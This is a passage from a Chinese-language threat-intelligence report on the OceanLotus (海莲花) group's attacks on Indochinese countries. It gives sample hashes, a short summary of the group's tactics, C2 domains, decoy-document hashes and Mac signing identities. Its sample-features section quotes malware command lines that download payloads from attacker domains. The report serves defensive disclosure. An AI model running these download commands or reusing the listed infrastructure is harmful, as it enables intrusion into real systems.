+因此，我们对该时间进行关联捕获后，发现了多个海莲花的关联样本。
+文件名 MD5
+60982849-c8e4-4039-8f59-dfb78d8bab0d bcbc1bef20d2befdd290e31269e0174a
+15f5adf1-8798-49bf-b666-4a6c3d90b69e
+4052d2e7-ca42-4cd4-8841-52f782bba411 dfaa343552e8d470096a0a09a018930f
+ffea6446-ab7a-4e47-b7ff-e461f9775177 9b1ce9df321ce88ade4ff3b0ada5d414
+5d47e097-c3bc-401e-8c0f-e877280b368a da14eece6191551a31d37d1e96681cd1
+Thu moi 2019.rar 76289f02a0b31143d87d5e35839fb24a
+因此可以进一步肯定，海莲花团伙会自定义样本的生成时间，并批量生成样本进行投放。
+
+总结
+本报告涉及了大量的对于海莲花团伙对中南半岛国家攻击活动及所使用的资源，揭示了其从不停歇的攻击历史、极其广泛的攻击目标和非常有创意的技术手段。海莲花组织无论是针对国内外进行攻击，其投放诱饵的手段、载荷变化、木马免杀技术，甚至是回连域名资产均在不停地演进变化，体现了非常强大的对抗能力和攻击意志。
+因此，我们在跟踪海莲花针对中国的攻击活动时，通过分析海莲花针对其他实体攻击行动中所体现的 TTP，对其加深了解并持续进行针对性的对抗，这个过程永无止境。
+
+IOC
+域名
+syn.servebbs.com
+word.webhop.info
+beta.officopedia.com
+outlook.updateoffices.net
+outlook.betamedias.com
+outlook.officebetas.com
+office.allsafebrowsing.com
+open.betaoffice.net
+cortanazone.com
+b.cortanazone.com
+cortanasyn.com
+api.blogdns.com
+dominikmagoffin.com
+blog.artinhauvin.com
+worker.baraeme.com
+kingsoftcdn.com
+style.fontstaticloader.com
+plan.evillese.com
+bluesky2018man.com
+enum.arkoorr.com
+background.ristians.com
+pong.dynathome.net
+zone.servehttp.com
+cdn.eworldship-news.com
+api.blogdns.com
+online.stienollmache.xyz
+image.fontstaticloader.com
+mappingpotentials.com
+vnbizcom.com
+cdn3.onlinesurveygorilla.com
+eworldship-news.com
+enormousamuses.com
+163mailservice.com
+stackbio.com
+mailserviceactivation.com
+web.dalalepredaa.com
+rio.imbandaad.com
+p12.alerentice.com
+
+诱饵文档
+fd128b9f0cbdc374227cf5564371aacc
+4a0144c7436e3ff67cf2d935d82d1743
+4c30e792218d5526f6499d235448bdd9
+d8a5a375da7798be781cf3ea689ae7ab
+2d3fb8d5b4cefc9660d98e0ad46ff91a
+89e3f31c6261f4725b891c8fd29049c9
+7b0e819bd8304773c3648ab03c9f182a
+c4d35f3263fef4a533e7403682a034c3
+b1df440e5dd64ffae9f7e792993f2f4c
+a76be0181705809898d5d7d9aed86ee8
+2785311085b6ca782b476d9c2530259c
+60501717f81eacd54facecf3ebadc306
+3d7cd531d17799832e262eb7995abde6
+c7931fa4c144c1c4dc19ad4c41c1e17f
+
+同源文档:
+5c9ef8b5263651a08ea1b79057a5ee28
+b858c08cf7807e462ca335233bd83fe7
+c313f8a5fd8ca391fc85193bc879ab02
+473fdfefa92725099ca87e992edbc92c
+02cec2f17a7910b6fa994f340bbbc297
+dd5ae0c0a7e17d101f570812fec4e5e4
+90e5ff68bf06cb930ed8c040139c4650
+6db450c4c756071ecafff425d6183d7d
+cb39e2138af92c32e53c97c0aa590d48
+8e13895504e643cd8e0e87377b25bd6b
+d3c27f779d615a1d3a35dff5e9561eb0
+27425360d18feea54860420006ea9833
+cf0142da12509f544a59093495c3a6dd
+b1df440e5dd64ffae9f7e792993f2f4c
+878fa022bd5e5caf678fe8d728ce42ee
+f78be074f6bc67a712e751254df5f166
+e2aed850c18449a43886fc79b342132f
+74b456adf2ae708789fb2d34ecccb954
+72263750df84e24fe645206a51772c88
+3a574c28beca4f3c94d30e3cf3979f4c
+ee836e0f7a40571523bf56dba59898f6
+f6068b672a19ce14981df011a55081e4
+00ac0d7337290b74bdd7f43ec4a67ddb
+
+同源 PE
+2f9af6b9d73218c578653d6d9bd02d4d
+c9d29501410e19938cd8e01630dc677b
+
+URL:
+http[:]//download-attachments.s3.amazonaws.com/db08b565038ac83e89e7b55201479f37ea49e525/f0c6ea8e-d2f8-445f-b649-57808b2015b7
+
+样本特征:
+ZA:\Code\Macro_NB2\Request\PostData32.exe -u https://word.webhop.info/blak32.gif -t 200000
+ZA:\Code\Macro_NB2\Request\PostData32.exe -u https://syn.servebbs.com/kuss32.gif -t 200000
+UA:\Code\Nb2VBS\Request\PostData32.exe -u https://ristineho.com/threex32.png -t 60000
+XA:\Code\Macro_NB2\Request\PostData32.exe -u https://cortanasyn.com/kirr32.png -t 200000
+C:\Users\WIN7UTL64\Desktop\Macro_NB2_new\Request\PostData32.exe
+{C:\Users\WIN7UTL64\Desktop\Macro_NB2_new\Request\PostData32.exe -u https://office.allsafebrowsing.com/fdsw32.png -t 240000
+SecurityAndMaintenance_Error.bin
+d:\work\malware\vinacap\SecurityAndMaintenance_Error.png
+d:\work\forensics\vinacap\dfir\nhule\files\SecurityAndMaintenance_Error.png
+D:\work\forensics\vinacap\DFIR\Nhule\files\SecurityAndMaintenance_Error.png
+
+MAC 样本签名：
+Melinda Cline (P74QRJXB2F)
+DAVID DOWELL (B5YH6VDVRE)
